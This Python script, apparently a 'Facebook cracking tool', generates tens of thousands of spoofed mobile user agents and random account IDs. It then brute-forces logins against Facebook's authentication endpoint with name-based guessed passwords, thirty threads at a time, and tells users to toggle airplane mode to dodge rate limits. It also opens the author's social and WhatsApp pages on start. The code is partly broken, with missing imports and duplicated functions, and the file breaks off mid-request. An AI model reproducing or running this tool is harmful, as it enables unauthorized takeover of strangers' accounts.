import random
import string
import random
import string
import time
import os
from concurrent.futures import ThreadPoolExecutor as tred

ugen = []

# Samsung Galaxy models 2018-2025
samsung_models = [
    # Galaxy S series (2018-2025)
    'SM-G960F','SM-G965F','SM-G970F','SM-G973F','SM-G975F','SM-G977B','SM-G980F','SM-G981B',
    'SM-G985F','SM-G986B','SM-G988B','SM-G990B','SM-G991B','SM-G996B','SM-G998B','SM-S901B',
    'SM-S906B','SM-S908B','SM-S911B','SM-S916B','SM-S918B','SM-S921B','SM-S926B','SM-S928B',
    # Galaxy A series (2018-2025)
    'SM-A105F','SM-A205F','SM-A305F','SM-A405F','SM-A505F','SM-A705F','SM-A125F','SM-A225F',
    'SM-A325F','SM-A525F','SM-A725F','SM-A145F','SM-A245F','SM-A345F','SM-A445F','SM-A146B',
    'SM-A246B','SM-A346B','SM-A446B','SM-A546B','SM-A556B','SM-A736B','SM-A256B','SM-A356B',
    # Galaxy J series (2018-2020)
    'SM-J330F','SM-J530F','SM-J730F','SM-J415F','SM-J610F','SM-J810F','SM-J260F','SM-J400F',
    'SM-J600F','SM-J700F','SM-J320F','SM-J510F','SM-J710F','SM-J250F','SM-J337A','SM-J737A',
    # Galaxy M series (2019-2025)
    'SM-M105F','SM-M205F','SM-M305F','SM-M215F','SM-M315F','SM-M515F','SM-M125F','SM-M225F',
    'SM-M325F','SM-M525F','SM-M135F','SM-M235F','SM-M335F','SM-M535F','SM-M145F','SM-M245F'
]

# iPhone models 2018-2025
iphone_models = [
    # iPhone XR, XS series (2018)
    'iPhone11,8','iPhone11,2','iPhone11,4','iPhone11,6',
    # iPhone 11 series (2019) 
    'iPhone12,1','iPhone12,3','iPhone12,5',
    # iPhone SE 2nd gen (2020)
    'iPhone12,8',
    # iPhone 12 series (2020)
    'iPhone13,1','iPhone13,2','iPhone13,3','iPhone13,4',
    # iPhone 13 series (2021)
    'iPhone14,4','iPhone14,5','iPhone14,2','iPhone14,3',
    # iPhone SE 3rd gen (2022)
    'iPhone14,6',
    # iPhone 14 series (2022)
    'iPhone14,7','iPhone14,8','iPhone15,2','iPhone15,3',
    # iPhone 15 series (2023)
    'iPhone15,4','iPhone15,5','iPhone16,1','iPhone16,2',
    # iPhone 16 series (2024-2025)
    'iPhone16,3','iPhone16,4','iPhone17,1','iPhone17,2','iPhone17,3','iPhone17,4'
]

# Xiaomi/Redmi models 2018-2025
xiaomi_models = [
    # Mi series (2018-2021)
    'MI 8','MI 8 Lite','MI 9','MI 9T','MI 9T Pro','MI 10','MI 10T','MI 10T Pro','MI 11','MI 11T',
    'M1803E1A','M1805E1A','M1902F1G','M1903F10G','M1906F9SH','M2001J2G','M2007J3SY','M2102K1G',
    # Redmi Note series (2018-2025)
    'Redmi Note 5','Redmi Note 6 Pro','Redmi Note 7','Redmi Note 8','Redmi Note 9','Redmi Note 10',
    'Redmi Note 11','Redmi Note 12','Redmi Note 13','M1803E7SG','M1806E7TG','M1901F7G','M1908C3JG',
    '2201116SG','2203121C','2206123SC','22081212UG','2210132G','2211133G','2303129G','23078PND5G',
    # Redmi series (2018-2025)
    'Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi 10','Redmi 11','Redmi 12','Redmi 13','Redmi 14',
    'M1804C3DG','M1810F6G','M1908C3IG','M2004J19C','21061119AG','22011119UY','23028RA60L'
]

# OnePlus models 2018-2025
oneplus_models = [
    # OnePlus 6 series (2018)
    'ONEPLUS A6000','ONEPLUS A6003','A6000','A6003',
    # OnePlus 7 series (2019)
    'GM1903','GM1905','GM1907','GM1911','GM1913','GM1915','GM1917',
    # OnePlus 8 series (2020)
    'IN2023','IN2025','IN2020','IN2010','IN2013','KB2001','KB2003','KB2005',
    # OnePlus 9 series (2021)
    'LE2113','LE2115','LE2117','LE2119','LE2121','LE2123','LE2125','LE2127',
    # OnePlus 10 series (2022)
    'NE2213','NE2215','NE2217','CPH2449','CPH2451',
    # OnePlus 11 series (2023)
    'CPH2449','CPH2451','CPH2413','CPH2415',
    # OnePlus 12 series (2024-2025)
    'CPH2581','CPH2583','CPH2609','CPH2611','CPH2617','CPH2619'
]

# Realme models 2018-2025
realme_models = [
    # Realme 1-6 series (2018-2020)
    'RMX1801','RMX1803','RMX1805','RMX1809','RMX1811','RMX1821','RMX1825','RMX1827','RMX1831',
    'RMX1851','RMX1901','RMX1903','RMX1905','RMX1911','RMX1925','RMX1927','RMX1971','RMX2001',
    'RMX2030','RMX2040','RMX2061','RMX2063','RMX2071','RMX2075','RMX2111','RMX2117','RMX2144',
    # Realme C/Narzo series (2020-2025)
    'RMX2170','RMX2151','RMX2205','RMX3121','RMX3350','RMX3371','RMX3381','RMX3393','RMX3461',
    'RMX3511','RMX3516','RMX3571','RMX3572','RMX3741','RMX3760','RMX3785','RMX3810','RMX3820',
    'RMX3830','RMX3834','RMX3851','RMX3890','RMX3900'
]

# Oppo models 2018-2025
oppo_models = [
    # F series (2018-2025)
    'CPH1803','CPH1805','CPH1809','CPH1823','CPH1825','CPH1831','CPH1833','CPH1837','CPH1851',
    'CPH1903','CPH1905','CPH1909','CPH1920','CPH1969','CPH1987','CPH2001','CPH2015','CPH2059',
    'CPH2071','CPH2077','CPH2125','CPH2127','CPH2179','CPH2185','CPH2206','CPH2219','CPH2239',
    'CPH2305','CPH2321','CPH2325','CPH2333','CPH2343','CPH2357','CPH2365','CPH2371','CPH2381',
    # A series (2019-2025)
    'CPH1912','CPH1920','CPH1943','CPH2015','CPH2127','CPH2185','CPH2239','CPH2305','CPH2381'
]

# Vivo models 2018-2025
vivo_models = [
    # Y series (2018-2025)
    'vivo 1808','vivo 1814','vivo 1818','vivo 1820','vivo 1838','vivo 1901','vivo 1902','vivo 1904',
    'V1836A','V1838A','V1901A','V1916A','V1955A','V1962A','V2023','V2025','V2031','V2073',
    'V2109','V2120','V2134','V2218','V2227','V2243','V2250','V2256','V2290','V2324'
]

# Google Pixel models 2018-2025
pixel_models = [
    # Pixel 3 series (2018)
    'Pixel 3','Pixel 3 XL','Pixel 3a','Pixel 3a XL',
    # Pixel 4 series (2019)
    'Pixel 4','Pixel 4 XL','Pixel 4a','Pixel 4a 5G',
    # Pixel 5 series (2020)
    'Pixel 5','Pixel 5a',
    # Pixel 6 series (2021)
    'Pixel 6','Pixel 6 Pro','Pixel 6a',
    # Pixel 7 series (2022)
    'Pixel 7','Pixel 7 Pro','Pixel 7a',
    # Pixel 8 series (2023)
    'Pixel 8','Pixel 8 Pro','Pixel 8a',
    # Pixel 9 series (2024-2025)
    'Pixel 9','Pixel 9 Pro','Pixel 9 Pro XL','Pixel 9a'
]

# Huawei models 2018-2025
huawei_models = [
    # P series (2018-2022)
    'EML-L29','CLT-L29','VOG-L29','ELE-L29','ANA-NX9','JSC-AN00','BAL-AL50',
    # Mate series (2018-2022)
    'HMA-L29','LYA-L29','TAS-L29','OCE-AN50','LNA-AL00','CDY-NX9A','TET-AN50',
    # Honor series (2018-2025)
    'COL-L29','YAL-L21','BMH-AN20','FNE-NX9','ANY-NX9','PPA-AL20','BRQ-AN00'
]

# Tecno models 2018-2025
tecno_models = [
    'TECNO KC2','TECNO KC6','TECNO KC8','TECNO KE5','TECNO KE6','TECNO KE7','TECNO KF6',
    'TECNO KF7','TECNO KF8','TECNO KG5','TECNO KG7','TECNO KG8','TECNO KH7','TECNO KI5',
    'TECNO KI7','TECNO LD7','TECNO LG7n','TECNO LG8n','TECNO LH8n','TECNO BD4h','TECNO CE8',
    'TECNO CE9','TECNO BE8','TECNO BD3','TECNO BD4j','TECNO IN1','TECNO IN2','TECNO IN6'
]

# Infinix models 2018-2025
infinix_models = [
    'Infinix X6812B','Infinix X6815B','Infinix X6817B','Infinix X6819','Infinix X6833B',
    'Infinix X6851','Infinix X6739','Infinix X682B','Infinix X683B','Infinix X687',
    'Infinix X688B','Infinix X690B','Infinix X692','Infinix X695','Infinix X6511B'
]

# Pattern 1: Samsung devices (12,000 agents)
def generate_samsung_agents():
    agents = []
    
    for _ in range(12000):
        android_ver = random.choice(['7.0','8.0','8.1','9','10','11','12','13','14','15'])
        model = random.choice(samsung_models)
        chrome_ver = random.randrange(70, 125)  # 2018-2025 Chrome versions
        build_num = random.randrange(3500, 6000)
        minor_ver = random.randrange(20, 250)
        
        # Random build ID patterns
        build_patterns = ['TQ1A.220905.001','SP1A.210812.016','RKQ1.200826.002','QP1A.190711.020']
        build_id = random.choice(build_patterns)
        
        ua = f"Mozilla/5.0 (Linux; Android {android_ver}; {model} Build/{build_id}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_ver}.0.{build_num}.{minor_ver} Mobile Safari/537.36"
        agents.append(ua)
    
    return agents

# Pattern 2: iPhone/iPad models (8,000 agents)
def generate_ios_agents():
    agents = []
    
    for _ in range(8000):
        ios_versions = ['12_0','12_4','13_0','13_7','14_0','14_8','15_0','15_7','16_0','16_7','17_0','17_5','18_0']
        ios_ver = random.choice(ios_versions)
        model = random.choice(iphone_models)
        webkit_ver = random.choice(['604.1.34','605.1.15','605.1.16','618.1.25'])
        safari_ver = random.choice(['12.0','13.0','14.0','15.0','16.0','17.0','18.0'])
        
        if random.choice([True, False]):
            # iPhone
            ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver} like Mac OS X) AppleWebKit/{webkit_ver} (KHTML, like Gecko) Version/{safari_ver} Mobile/15E148 Safari/604.1"
        else:
            # iPad  
            ua = f"Mozilla/5.0 (iPad; CPU OS {ios_ver} like Mac OS X) AppleWebKit/{webkit_ver} (KHTML, like Gecko) Version/{safari_ver} Mobile/15E148 Safari/604.1"
        
        agents.append(ua)
    
    return agents

# Pattern 3: Xiaomi/Redmi models (8,000 agents)
def generate_xiaomi_agents():
    agents = []
    
    for _ in range(8000):
        android_ver = random.choice(['8.1','9','10','11','12','13','14','15'])
        model = random.choice(xiaomi_models)
        chrome_ver = random.randrange(70, 125)
        build_num = random.randrange(3800, 5800)
        minor_ver = random.randrange(25, 220)
        
        # MIUI build patterns
        miui_builds = ['PKQ1.190118.001','QKQ1.200209.002','RKQ1.200826.002','TKQ1.220829.002']
        build_id = random.choice(miui_builds)
        
        ua = f"Mozilla/5.0 (Linux; Android {android_ver}; {model} Build/{build_id}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_ver}.0.{build_num}.{minor_ver} Mobile Safari/537.36"
        agents.append(ua)
    
    return agents

# Pattern 4: OnePlus models (5,000 agents)
def generate_oneplus_agents():
    agents = []
    
    for _ in range(5000):
        android_ver = random.choice(['8.1','9','10','11','12','13','14','15'])
        model = random.choice(oneplus_models)
        chrome_ver = random.randrange(75, 125)
        build_num = random.randrange(4000, 5500)
        minor_ver = random.randrange(30, 200)
        
        # OxygenOS build patterns
        oxygen_builds = ['PKQ1.181203.001','QKQ1.190716.003','RKQ1.201022.002','TKQ1.220829.002']
        build_id = random.choice(oxygen_builds)
        
        ua = f"Mozilla/5.0 (Linux; Android {android_ver}; {model} Build/{build_id}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.{build_num}.{minor_ver} Mobile Safari/537.36"
        agents.append(ua)
    
    return agents

# Pattern 5: Realme models (5,000 agents)
def generate_realme_agents():
    agents = []
    
    for _ in range(5000):
        android_ver = random.choice(['8.1','9','10','11','12','13','14','15'])
        model = random.choice(realme_models)
        chrome_ver = random.randrange(72, 125)
        build_num = random.randrange(3900, 5400)
        minor_ver = random.randrange(28, 190)
        
        realme_builds = ['PKQ1.190918.001','QP1A.190711.020','RKQ1.200826.002','TQ1A.220905.001']
        build_id = random.choice(realme_builds)
        
        ua = f"Mozilla/5.0 (Linux; Android {android_ver}; {model} Build/{build_id}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_ver}.0.{build_num}.{minor_ver} Mobile Safari/537.36"
        agents.append(ua)
    
    return agents

# Pattern 6: Windows Chrome/Edge (5,000 agents)
def generate_windows_agents():
    agents = []
    
    for _ in range(5000):
        windows_versions = ['6.1','6.3','10.0','11.0']
        win_ver = random.choice(windows_versions)
        chrome_ver = random.randrange(70, 125)
        build_num = random.randrange(4500, 6200)
        minor_ver = random.randrange(100, 400)
        
        if random.choice([True, False]):
            # Chrome
            ua = f"Mozilla/5.0 (Windows NT {win_ver}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.{build_num}.{minor_ver} Safari/537.36"
        else:
            # Edge
            ua = f"Mozilla/5.0 (Windows NT {win_ver}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.{build_num}.{minor_ver} Safari/537.36 Edg/{chrome_ver}.0.{build_num}.{minor_ver}"
        
        agents.append(ua)
    
    return agents

# Pattern 7: macOS Safari/Chrome (3,000 agents)
def generate_mac_agents():
    agents = []
    
    for _ in range(3000):
        macos_versions = ['10_13_6','10_14_6','10_15_7','11_0_0','12_0_0','13_0_0','14_0_0','15_0_0']
        macos_ver = random.choice(macos_versions)
        
        if random.choice([True, False]):
            # Safari
            safari_ver = random.choice(['12.0','13.0','14.0','15.0','16.0','17.0','18.0'])
            webkit_ver = random.choice(['605.1.15','604.1.34','618.1.25'])
            ua = f"Mozilla/5.0 (Macintosh; Intel Mac OS X {macos_ver}) AppleWebKit/{webkit_ver} (KHTML, like Gecko) Version/{safari_ver} Safari/{webkit_ver}"
        else:
            # Chrome on Mac
            chrome_ver = random.randrange(70, 125)
            build_num = random.randrange(4500, 6000)
            minor_ver = random.randrange(100, 300)
            ua = f"Mozilla/5.0 (Macintosh; Intel Mac OS X {macos_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.{build_num}.{minor_ver} Safari/537.36"
        
        agents.append(ua)
    
    return agents

# Pattern 8: Oppo/Vivo models (4,000 agents)
def generate_oppo_vivo_agents():
    agents = []
    all_models = oppo_models + vivo_models
    
    for _ in range(4000):
        android_ver = random.choice(['8.1','9','10','11','12','13','14','15'])
        model = random.choice(all_models)
        chrome_ver = random.randrange(72, 125)
        build_num = random.randrange(3800, 5600)
        minor_ver = random.randrange(25, 185)
        
        colorsos_builds = ['PKQ1.190302.001','QP1A.190711.020','RKQ1.200826.002','TQ1A.220905.001']
        build_id = random.choice(colorsos_builds)
        
        ua = f"Mozilla/5.0 (Linux; Android {android_ver}; {model} Build/{build_id}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_ver}.0.{build_num}.{minor_ver} Mobile Safari/537.36"
        agents.append(ua)
    
    return agents

# Pattern 9: Google Pixel models (2,000 agents)
def generate_pixel_agents():
    agents = []
    
    for _ in range(2000):
        android_ver = random.choice(['9','10','11','12','13','14','15'])
        model = random.choice(pixel_models)
        chrome_ver = random.randrange(75, 125)
        build_num = random.randrange(4200, 5800)
        minor_ver = random.randrange(50, 220)
        
        pixel_builds = ['PQ3A.190801.002','QQ3A.200705.002','RQ3A.210905.001','TQ1A.220905.001']
        build_id = random.choice(pixel_builds)
        
        ua = f"Mozilla/5.0 (Linux; Android {android_ver}; {model} Build/{build_id}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.{build_num}.{minor_ver} Mobile Safari/537.36"
        agents.append(ua)
    
    return agents

# Pattern 10: Huawei/Tecno/Infinix models (4,000 agents)
def generate_other_brands_agents():
    agents = []
    all_models = huawei_models + tecno_models + infinix_models
    
    for _ in range(4000):
        android_ver = random.choice(['7.0','8.0','9','10','11','12','13','14','15'])
        model = random.choice(all_models)
        chrome_ver = random.randrange(68, 125)
        build_num = random.randrange(3500, 5900)
        minor_ver = random.randrange(20, 200)
        
        emui_builds = ['HUAWEIELE-L29','TKQ1.220829.002','PKQ1.190319.001','RKQ1.200826.002']
        build_id = random.choice(emui_builds)
        
        ua = f"Mozilla/5.0 (Linux; Android {android_ver}; {model} Build/{build_id}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_ver}.0.{build_num}.{minor_ver} Mobile Safari/537.36"
        agents.append(ua)
    
    return agents

# Generate all user agents
print("Generating comprehensive 2018-2025 user agents...")

ugen.extend(generate_samsung_agents())      # 12,000
ugen.extend(generate_ios_agents())          # 8,000  
ugen.extend(generate_xiaomi_agents())       # 8,000
ugen.extend(generate_oneplus_agents())      # 5,000
ugen.extend(generate_realme_agents())       # 5,000
ugen.extend(generate_windows_agents())      # 5,000
ugen.extend(generate_mac_agents())          # 3,000
ugen.extend(generate_oppo_vivo_agents())    # 4,000
ugen.extend(generate_pixel_agents())        # 2,000
ugen.extend(generate_other_brands_agents()) # 4,000

# Shuffle the list to mix different types
random.shuffle(ugen)

# Trim to exactly 50,000
ugen = ugen[:50000]

print(f"Generated {len(ugen)} comprehensive user agents (2018-2025)\n")
print("Sample User Agents from different years:")
for i in range(15):
    print(f"{i+1}. {ugen[i]}\n")

# Functions for usage
def get_random_ua():
    return random.choice(ugen)

def get_samsung_ua():
    samsung_uas = [ua for ua in ugen if any(model in ua for model in samsung_models)]
    return random.choice(samsung_uas) if samsung_uas else get_random_ua()

def get_iphone_ua():
    iphone_uas = [ua for ua in ugen if 'iPhone' in ua]
    return random.choice(iphone_uas) if iphone_uas else get_random_ua()

def save_to_file(filename='user_agents_2018_2025.txt'):
    with open(filename, 'w', encoding='utf-8') as f:
        for ua in ugen:
            f.write(ua + '\n')
    print(f"Saved {len(ugen)} user agents to {filename}")

# Usage examples
print("\n--- Usage Examples ---")
print("Random UA:", get_random_ua()[:80] + "...")
print("Samsung UA:", get_samsung_ua()[:80] + "...")  
print("iPhone UA:", get_iphone_ua()[:80] + "...")
print(f"\nTotal UAs: {len(ugen)}")
print("To save: save_to_file()")

try:
    if platform.system() == "Linux":
        os.system(
            'xdg-open https://www.facebook.com/profile.php?id=100004682100211')
        os.system('xdg-open https://wa.me/923079741690')
    elif platform.system() == "Windows":
        os.system(
            'start https://www.facebook.com/profile.php?id=100004682100211')
        os.system('start https://wa.me/923079741690')
    elif platform.system() == "Darwin":
        os.system(
            'open https://www.facebook.com/profile.php?id=100004682100211')
        os.system('open https://wa.me/923079741690')
except: 
    pass
	    
def linex():
    print(f'\r\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def line():
    print(f'\r\n\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')



logo = f"""
\x1b[38;5;46m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\x1b[38;5;46m║                                           ║
\x1b[38;5;46m║    ███╗░░░███╗░█████╗░░█████╗░███████╗    ║
\x1b[38;5;46m║    ████╗░████║██╔══██╗██╔══██╗╚════██║    ║
\x1b[38;5;46m║    ██╔████╔██║███████║███████║░░███╔═╝    ║
\x1b[38;5;46m║    ██║╚██╔╝██║██╔══██║██╔══██║██╔══╝░░    ║
\x1b[38;5;46m║    ██║░╚═╝░██║██║░░██║██║░░██║███████╗    ║
\x1b[38;5;46m║    ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝    ║
\x1b[38;5;46m║                                           ║
\x1b[38;5;46m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝

\x1b[38;5;46m╔═══════════════════════════════════════════╗
\x1b[38;5;46m║     \033[1;97m[ PREMIUM FACEBOOK CRACKING TOOL ]     \x1b[38;5;46m║
\x1b[38;5;46m╚═══════════════════════════════════════════╝

\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mDEVELOPER   \x1b[38;5;46m▶  \033[1;97mMohammad MAAZ
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mWHATSAPP    \x1b[38;5;46m▶  \033[1;97m+923079741690
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mFEATURE     \x1b[38;5;46m▶  \033[1;97mOLD FACEBOOK CLONE
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mVERSION     \x1b[38;5;46m▶  \033[1;97mv2.7 PREMIUM
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSTATUS      \x1b[38;5;46m▶  \033[1;97mFULLY WORKING ✓
\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""


def clear():
    os.system('clear')
    print(logo)


def main():
    clear()
    os.system('espeak -a 300 "Welcome to MAAZ tools"')

    animation = [
        "[\x1b[38;5;46m■\033[1;97m□□□□□□□□□]",
        "[\x1b[38;5;46m■■\033[1;97m□□□□□□□□]",
        "[\x1b[38;5;46m■■■\033[1;97m□□□□□□□]",
        "[\x1b[38;5;46m■■■■\033[1;97m□□□□□□]",
        "[\x1b[38;5;46m■■■■■\033[1;97m□□□□□]",
        "[\x1b[38;5;46m■■■■■■\033[1;97m□□□□]",
        "[\x1b[38;5;46m■■■■■■■\033[1;97m□□□]",
        "[\x1b[38;5;46m■■■■■■■■\033[1;97m□□]",
        "[\x1b[38;5;46m■■■■■■■■■\033[1;97m□]",
        "[\x1b[38;5;46m■■■■■■■■■■\033[1;97m]"
    ]

    for i in range(30):
        time.sleep(0.1)
        sys.stdout.write(
            f"\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \x1b[38;5;46mLOADING...\033[1;97m "
            + animation[i % len(animation)] + "\033[1;97m ")
        sys.stdout.flush()

    clear()

def clear():
    os.system('clear')

def linex():
    print('\033[1;37m' + '─' * 50)

def line():
    print('\033[1;37m' + '─' * 50)

# Global variables for results
oks = []
cps = []
loop = 0

# User agent list (add your user agents here)
ugen = [
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; RMX3571) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]

def main():
    clear()
    print(f'\x1b[38;5;46m[\033[1;97m🔥\x1b[38;5;46m] \033[1;97mFACEBOOK CLONING TOOL 2018-2025')
    linex()
    print(f'\x1b[38;5;46m[\033[1;97m1\x1b[38;5;46m] \033[1;97mSERIES SELECTION \x1b[38;5;46m[\x1b[38;5;46mSeries\x1b[38;5;46m/\x1b[38;5;46mBased\x1b[38;5;46m]\033[1;97m')
    linex()
    ch = input(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m')

    if ch in ('1', '01', '11', 'a', 'A'):
        SERIES_SELECTION()
    else:
        print(f'\x1b[38;5;160m[\033[1;97m❌\x1b[38;5;160m] \033[1;97mINVALID SELECTION!')
        time.sleep(2)
        main()

def SERIES_SELECTION():
    user = []
    clear()
    print(f'\x1b[38;5;46m[\033[1;97m🔥\x1b[38;5;46m] \033[1;97mSELECT SERIES FOR CLONING:')
    linex()
    print(f'\x1b[38;5;46m[\033[1;97m1\x1b[38;5;46m] \033[1;97m1000 Series')
    print(f'\x1b[38;5;46m[\033[1;97m2\x1b[38;5;46m] \033[1;97m6155 Series')
    print(f'\x1b[38;5;46m[\033[1;97m3\x1b[38;5;46m] \033[1;97m6156 Series')
    print(f'\x1b[38;5;46m[\033[1;97m4\x1b[38;5;46m] \033[1;97m6157 Series')
    linex()
    
    series_choice = input(f'\x1b[38;5;46m[\033[1;97m🎯\x1b[38;5;46m] \033[1;97mSELECT SERIES \x1b[38;5;46m▶ \033[1;97m')
    
    # Simple series mapping
    series_map = {
        '1': '1000',
        '2': '6155', 
        '3': '6156',
        '4': '6157'
    }
    
    if series_choice in series_map:
        selected_series = series_map[series_choice]
        START_SERIES_CLONING(selected_series)
    else:
        print(f'\x1b[38;5;160m[\033[1;97m❌\x1b[38;5;160m] \033[1;97mINVALID SELECTION!')
        time.sleep(2)
        SERIES_SELECTION()

def START_SERIES_CLONING(series_code):
    user = []
    clear()
    
    print(f'\x1b[38;5;46m[\033[1;97m🔥\x1b[38;5;46m] \033[1;97mSELECTED SERIES: \x1b[38;5;46m{series_code}')
    print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mEXAMPLE \x1b[38;5;46m ▶ \033[1;97m10000\x1b[38;5;46m|\033[1;97m30000\x1b[38;5;46m|\033[1;97m50000\x1b[38;5;46m|\033[1;97m99999')
    linex()
    
    try:
        limit = int(input(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m'))
    except ValueError:
        print(f'\x1b[38;5;160m[\033[1;97m❌\x1b[38;5;160m] \033[1;97mINVALID NUMBER!')
        time.sleep(2)
        START_SERIES_CLONING(series_code)
        return
    
    linex()
    
    # Generate IDs with selected series code (15 digits total)
    for i in range(limit):
        if series_code == '1000':
            # For 1000 series - 11 more digits
            data = ''.join(random.choice(string.digits) for _ in range(11))
        else:
            # For 6155, 6156, 6157 series - 11 more digits  
            data = ''.join(random.choice(string.digits) for _ in range(10))
        
        uid = series_code + data
        user.append(uid)
    
    with tred(max_workers=30) as jihad:
        clear()
        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mTOTAL ID \x1b[38;5;46m▶ \033[1;97m{len(user)}')
        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSERIES CODE \x1b[38;5;46m▶ \033[1;97m{series_code}')
        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE')
        linex()
        # Generate random name for password guessing
        names = ["ali", "ahmed", "hassan", "khan", "malik", "shah", "user", "admin"]
        random_name = random.choice(names)
        
        for mal in user:
            uid = mal
            jihad.submit(login1, uid, random_name)
    
    line()
    print(f'\r\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mYOUR SERIES CRACKED HAS BEEN COMPLETED...\x1b[38;5;46m!')
    linex()
    print(f"\r\r\r\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mTOTAL OK \x1b[38;5;46m▶ \x1b[38;5;46m{len(oks)}")
    linex()
    input(f'\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\x1b[38;5;46m!\033[1;37m')
    main()

# Password generator with guessing logic
def generate_passwords(name):
    base_name = name.lower().replace(" ", "")
    patterns = ["123", "786", "1122", "12345", "khan", "khan786", "@123"]

    passwords = [f"{base_name}{p}" for p in patterns]  # Name-based
    passwords.append(base_name + str(random.randint(100, 999)))  # Random number
    passwords.append(base_name[:3] + str(random.randint(1000, 9999)))  # Short name + number
    
    # Guessing logic
    reversed_name = base_name[::-1]
    initials = "".join([part[0] for part in base_name.split() if part])
    passwords.append(reversed_name + "123")
    passwords.append(initials + "786")
    passwords.append(initials + str(random.randint(1000, 9999)))

    return list(set(passwords))  # Remove duplicates

# Updated login function with password guessing
def login1(uid, name="user"):
    global oks, loop, cps
    Session = requests.session()
    try:
        sys.stdout.write(
            f'\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\x1b[38;5;46m-\x1b[38;5;46mB1\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\033[1;97m{loop}\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46mOK\x1b[38;5;46m/\x1b[38;5;226mCP\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46m{len(oks)}\x1b[38;5;46m/\x1b[38;5;46m{len(cps)}\x1b[38;5;46m]'
        )
        sys.stdout.flush()
        ua = random.choice(ugen)

        # Generate passwords dynamically from name
        for pw in generate_passwords(name):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            head = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 30000)),
                'X-FB-SIM-HNI': str(random.randint(29000, 40000)),
                'X-FB-Connection-Type': random.choice(['MOBILE.LTE', 'WIFI', 'MOBILE.3G', 'MOBILE.4G']),
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': str(random.randint(5000, 6000)),
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
